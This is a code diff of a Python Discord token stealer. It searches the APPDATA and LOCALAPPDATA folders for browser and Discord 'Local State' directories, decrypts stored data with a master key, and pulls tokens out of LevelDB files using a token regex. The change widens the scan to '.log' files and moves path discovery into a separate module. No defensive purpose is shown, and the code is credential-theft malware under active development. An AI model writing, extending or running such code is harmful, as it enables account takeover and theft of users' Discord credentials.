@@ -3,17 +3,14 @@ import re
 import os
 import time
 
-from queue import Queue
 from concurrent.futures import ThreadPoolExecutor
-from multiprocessing import Pool, Process, Manager
 from multiprocessing.pool import ThreadPool
 from os.path import join
-from os.path import sep as SEP
 from typing import List
 
 from utils.crypto import getmasterkey, decrypt
+from utils.paths import GetAppDataPaths
 
-CHUNK_SIZE = 100
 TOKEN_REGEX = re.compile(r"([\d\w]{24}\.[\d\w]{6}\.[\d\w_-]{38}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)")
 
 
@@ -24,15 +21,11 @@ def GetDiscordTokens() -> List[str]:
         future2 = executor.submit(GetAppDataPaths, 'LOCALAPPDATA')
     paths = future1.result() + future2.result()
     endtime = time.process_time()
-    print(paths)
-    print(f"Took {endtime - begintime} seconds for path discovery")
+    print(f"Path Discovery took {endtime - begintime} seconds")
     tokens = []
     for path in paths:
         keyfile = join(path, "Local State")
-        begintimeldb = time.process_time()
         ldbs = GetLDBFiles(path)
-        endtimeldb = time.process_time()
-        print(f"Took {endtimeldb - begintimeldb} seconds for ldb")
         for ldb in ldbs:
             try:
                 f = open(ldb, "r", errors="ignore")
@@ -68,7 +61,7 @@ def extract_files(dirs):
     ldbfiles = []
     for root, _, files in dirs:
         for file in files:
-            if file.endswith('.ldb'):
+            if file.endswith('.ldb') or file.endswith('.log'):
                 ldbfiles.append(os.path.join(root, file))
     return ldbfiles
 
@@ -97,34 +90,3 @@ def GetLDBFiles(path):
         ldbfiles.extend(files)
 
     return ldbfiles
-
-
-def process_directory(args):
-    root, results = args
-    datapaths = []
-
-    for subdir, _, files in os.walk(root):
-        for file in files:
-            path = os.path.join(subdir, file)
-            if "Local State" in path:
-                datapaths.append(SEP.join(path.split(SEP)[:-1]))
-
-    results.put(datapaths)
-
-
-def GetAppDataPaths(env):
-    results = Queue()
-
-    roots = []
-    for root, _, _ in os.walk(os.getenv(env)):
-        roots.append(root)
-
-    with ThreadPoolExecutor() as executor:
-        for i in range(0, len(roots), CHUNK_SIZE):
-            chunk = roots[i:i+CHUNK_SIZE]
-            executor.map(process_directory, ((root, results) for root in chunk))
-    datapaths = []
-    while not results.empty():
-        datapaths.extend(results.get())
-
-    return datapaths
